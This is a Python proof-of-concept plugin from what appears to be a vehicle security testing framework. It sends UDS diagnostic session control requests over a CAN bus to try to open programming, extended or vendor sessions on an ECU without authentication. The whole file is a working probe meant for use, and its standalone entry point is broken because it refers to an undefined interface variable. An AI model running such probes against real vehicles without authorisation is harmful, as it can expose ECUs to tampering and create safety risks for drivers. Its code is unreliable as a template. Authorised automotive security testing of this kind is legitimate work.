"""
PoC Name: UDS Diagnostic Session Bypass
CVE: N/A
Component: Canbus Stack
Category: Canbus
Severity: High
CVSS: 7.5
Description: 尝试UDS 0x10直接进入扩展诊断/编程会话
Prerequisites: SocketCAN接口, python-can库。
Usage: python3 26_UDS_DiagSession_Bypass.py <can_interface>
"""
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
class UDSDiagSessionPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self): return True
    def exploit(self):
        iface = self.params.get("can_interface", "can0")
        self.logger.info(f"UDS诊断会话测试 ({iface})...")
        try:
            import can
            bus = can.interface.Bus(channel=iface, bustype="socketcan")
            sessions = [(0x02, "Programming"), (0x03, "ExtendedDiag"), (0x60, "Vendor")]
            for sub, name in sessions:
                msg = can.Message(arbitration_id=0x7E0,
                    data=[0x02, 0x10, sub, 0,0,0,0,0], is_extended_id=False)
                bus.send(msg)
                resp = bus.recv(timeout=1.0)
                if resp and len(resp.data) > 1:
                    if resp.data[1] == 0x50:
                        self.logger.warning(f"[+] {name}会话(0x{sub:02X})已开启！无需认证")
                        self.results["vulnerable"] = True
                        self.results["evidence"] = f"UDS session 0x{sub:02X} opened without auth"
                        bus.shutdown()
                        return self.results
                    elif resp.data[1] == 0x7F:
                        nrc = resp.data[3] if len(resp.data) > 3 else 0
                        self.logger.info(f"  {name}(0x{sub:02X}) 被拒绝 NRC=0x{nrc:02X}")
            bus.shutdown()
            self.logger.info("所有诊断会话均需要认证")
            self.results["vulnerable"] = False
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"UDS测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 26_UDS_DiagSession_Bypass.py <can_interface>")
        sys.exit(1)
    plugin = UDSDiagSessionPlugin({"target_ip": "N/A", "can_interface": iface})
    plugin.run_verify()
